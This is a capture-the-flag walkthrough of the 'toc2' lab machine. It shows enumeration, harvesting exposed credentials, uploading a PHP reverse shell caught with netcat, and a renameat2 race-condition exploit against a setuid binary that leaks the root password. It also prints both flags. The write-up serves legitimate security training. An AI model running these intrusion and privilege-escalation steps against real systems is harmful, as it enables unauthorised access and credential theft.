# toc2

It's a setup... Can you get the flags in time? 

I have a theory that the truth is never told during the nine-to-five hours. - Hunter S. Thompson

# Find and retrieve the user.txt flag

## Services

Nmap reveals 2 open ports:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 84:4e:b1:49:31:22:94:84:83:97:91:72:cb:23:33:36 (RSA)
|   256 cc:32:19:3f:f5:b9:a4:d5:ac:32:0f:6e:f0:83:35:71 (ECDSA)
|_  256 bd:d8:00:be:49:b5:15:af:bf:d5:85:f7:3a:ab:d6:48 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/cmsms/cmsms-2.1.6-install.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site Maintenance
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## CMS information

Connecting to the web service's default page reveals credentials: `cmsmsuser:devpass`:

~~~
┌──(kali㉿kali)-[/data/toc2]
└─$ curl -s http://10.10.215.10/                

<!doctype html>
<title>Site Maintenance</title>
<style>
  body { text-align: center; padding: 150px; }
  h1 { font-size: 50px; }
  body { font: 20px Helvetica, sans-serif; color: #333; }
  article { display: block; text-align: left; width: 650px; margin: 0 auto; }
  a { color: #dc8100; text-decoration: none; }
  a:hover { color: #333; text-decoration: none; }
</style>

<article>
    <h1>Under Construction!</h1>
    <div>
        <p>Sorry for the inconvenience but management have once again asked for more than we can deliver. </p>
        
        <p>The web server isn't going to be ready for the web dev team to build on for another few days. Just in case anyone around here except me wants to do anything: cmsmsuser:devpass </p>
        <p>&mdash; Hunter</p>
    </div>
</article>
~~~

Besides, there is also a `robots.txt` file that discloses the name of a database, as well as a CMS installation URL (CMS Made Simple):

~~~
┌──(kali㉿kali)-[/data/toc2]
└─$ curl -s http://10.10.215.10/robots.txt 
User-agent: *
Disallow: /cmsms/cmsms-2.1.6-install.php
 
Note to self:
Tommorow, finish setting up the CMS, and that database, cmsmsdb, so the site's ready by Wednesday.   
~~~

Running Gobuster won't reveal other locations. At this stage, here is the information collected so far:

* URL: `http://10.10.215.10/cmsms/cmsms-2.1.6-install.php`
* DB: `cmsmsdb`
* Username: `cmsmsuser`
* Password: `devpass`

## CMS Made Simple / Reverse Shell

Let's proceed with the installation of CMS Made Simple, as we have the setup PHP file.

Complete the installation and login to the admin panel. Then go to the file manager and upload a PHP reverse shell.

Start a listener (`nc -nlvp 4444`) and browse `10.10.215.10/cmsms/uploads/shell.php`.

We now have a reverse shell:

~~~
┌──(kali㉿kali)-[/data/toc2/files]
└─$ nc -nlvp 4444       
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.215.10] 34964
Linux toc 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 11:51:53 up 18 min,  0 users,  load average: 1.08, 1.71, 1.47
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

## User flag

The user flag is located in frank's home:

~~~
www-data@toc:/home/frank$ cat user.txt 
cat user.txt
thm{63616d70657276616e206c696665}
~~~

# Escalate your privileges and acquire root.txt

## Lateral move (www-data -> frank)

There is a note left in frank's home folder, disclosing frank's password: `password`.

~~~
www-data@toc:/home/frank$ cat new_machine.txt
cat new_machine.txt
I'm gonna be switching computer after I get this web server setup done. The inventory team sent me a new Thinkpad, the password is "password". It's funny that the default password for all the work machines is something so simple...Hell I should probably change this one from it, ah well. I'm switching machines soon- it can wait. 
~~~

Let's connect as `frank`:

~~~
www-data@toc:/home/frank/root_access$ su frank
su frank
Password: password

frank@toc:~/root_access$ id
id
uid=1000(frank) gid=1000(frank) groups=1000(frank),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
~~~

## The readcreds binary

There is an interesting folder called `root_access` in frank's home:

~~~
frank@toc:~/root_access$ ll
ll
total 28
drwxr-xr-x 2 frank frank 4096 Jan 31 17:29 ./
drwxr-xr-x 5 frank frank 4096 Aug 18  2020 ../
-rwsr-xr-x 1 root  root  8704 Jan 31 17:29 readcreds*
-rw-r--r-- 1 root  root   656 Jan 31 12:44 readcreds.c
-rw------- 1 root  root    34 Aug 23  2020 root_password_backup
~~~

The sources of the `readcreds` binary are provided:

```c
frank@toc:~/root_access$ cat readcreds.c
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    int file_data; char buffer[256]; int size = 0;

    if(argc != 2) {
      printf("Binary to output the contents of credentials file \n ./readcreds [file] \n"); 
      exit(1);
    }

    if (!access(argv[1],R_OK)) {
      sleep(1);
      file_data = open(argv[1], O_RDONLY);
    } else {
      fprintf(stderr, "Cannot open %s \n", argv[1]);
      exit(1);
    }

    do {
        size = read(file_data, buffer, 256);
        write(1, buffer, size);
    } 
    
    while(size>0);

}
```

## Race condition

Providing the `root_password_backup` file to the `readcreds` binary will show an error, as the file is owned by `root`. However, we can run a race condition attack.

Download [`rename.c`](https://raw.githubusercontent.com/sroettger/35c3ctf_chals/master/logrotate/exploit/rename.c). The source of the program is shown below:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

Compile the program (`gcc rename.c -o rename`), create a `pwd` file and run the `rename` binary as follows:

~~~
frank@toc:~/root_access$ touch pwd
frank@toc:~/root_access$ ./rename pwd root_password_backup
~~~

Now in another session:

~~~
www-data@toc:/home/frank/root_access$ ./readcreds root_password_backup
./readcreds root_password_backup
Root Credentials:  root:aloevera 
~~~

## Root flag

We can now log in as root and read the root flag:

~~~
www-data@toc:/home/frank/root_access$ su - root
su - root
Password: aloevera

root@toc:~# cat /root/root.txt
cat /root/root.txt
thm{7265616c6c696665}
~~~
